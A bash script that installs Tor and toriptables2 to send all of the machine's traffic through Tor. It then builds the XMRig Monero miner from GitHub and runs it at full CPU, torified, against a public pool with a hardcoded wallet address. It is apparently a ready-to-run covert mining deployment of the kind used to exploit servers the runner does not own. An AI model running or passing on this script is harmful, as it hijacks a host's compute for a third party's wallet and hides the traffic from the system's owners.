#!/bin/bash
apt-get update
apt-get install -y libmicrohttpd-dev libssl-dev cmake python build-essential libhwloc-dev screen git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libgmp-dev libuv1-dev tor python
git clone https://github.com/ruped24/toriptables2.git
cd toriptables2/
mv toriptables2.py /usr/local/bin/
cd
git clone https://github.com/xmrig/xmrig.git
systemctl start tor
toriptables2.py -l

cd xmrig
mkdir build
cd build
cmake ..
make
sysctl -w vm.nr_hugepages=128
torify ./xmrig --no-color --donate-level 1 --max-cpu-usage 100 --cpu-priority 5 -a cryptonight -k --tls -o pool.supportxmr.com:9000 -u 45W8gefZHpbBcevfEwq28DM5g5RKwQRNyGk88Mzc2e6YcswVCi1caWV8dzfyVxB6dKcQLyBGszpobPSfQR2QvMSw9e3hZkb -p x3 --b
